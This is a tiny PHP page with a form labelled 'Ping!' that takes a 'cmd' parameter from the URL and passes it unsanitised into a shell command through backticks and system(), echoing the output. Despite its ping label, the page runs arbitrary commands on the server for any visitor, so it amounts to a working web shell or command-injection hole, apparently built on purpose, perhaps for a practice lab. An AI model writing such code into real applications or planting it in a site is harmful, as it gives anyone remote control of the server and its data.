<form action="/index.php">
<input type="text" name="cmd" id="">    
    <button type="submit">Ping!</button>
</form>
<?php
if(isset($_GET['cmd'])){

   echo system(`ls | {$_GET['cmd']}`);
}
?>
